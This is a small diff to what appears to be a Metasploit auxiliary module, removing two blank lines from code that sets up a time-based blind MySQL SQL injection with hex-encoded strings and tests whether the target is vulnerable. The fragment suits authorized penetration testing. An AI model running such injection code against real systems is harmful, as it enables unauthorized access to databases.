@@ -71,7 +71,6 @@ class MetasploitModule < Msf::Auxiliary
       vprint_error('Invalid login, check credentials')
       return
     end
-
     @sqli = create_sqli(dbms: MySQLi::TimeBasedBlind, opts: { hex_encode_strings: true }) do |payload|
       res = send_request_cgi({
         'method' => 'POST',
@@ -92,7 +91,6 @@ class MetasploitModule < Msf::Auxiliary
       })
       fail_with Failure::Unreachable, 'Connection failed' unless res
     end
-
     unless @sqli.test_vulnerable
       print_bad("#{peer} - Testing of SQLi failed.  If this is time based, try increasing SqliDelay.")
       return
